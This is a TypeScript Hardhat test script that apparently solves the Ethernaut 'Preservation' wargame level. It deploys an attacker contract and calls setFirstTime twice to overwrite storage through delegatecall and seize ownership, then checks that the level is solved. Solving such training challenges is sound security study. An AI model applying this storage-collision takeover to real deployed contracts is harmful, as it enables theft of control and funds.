import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Preservation`);
  const challengeAddress = await createChallenge(
    `0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F`
  );

   challenge = await challengeFactory.attach(challengeAddress);
   const attackerFactory = await ethers.getContractFactory(`PreservationAttacker`);
   attacker = await attackerFactory.deploy();
});

it("solves the challenge", async function () {
    console.log("attacker address", attacker.address);
    await dumpStorage(eoa, challenge.address, 3);
    await challenge.setFirstTime(attacker.address);
    await dumpStorage(eoa, challenge.address, 3);
    await challenge.setFirstTime(await eoa.getAddress());
    await dumpStorage(eoa, challenge.address, 3);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
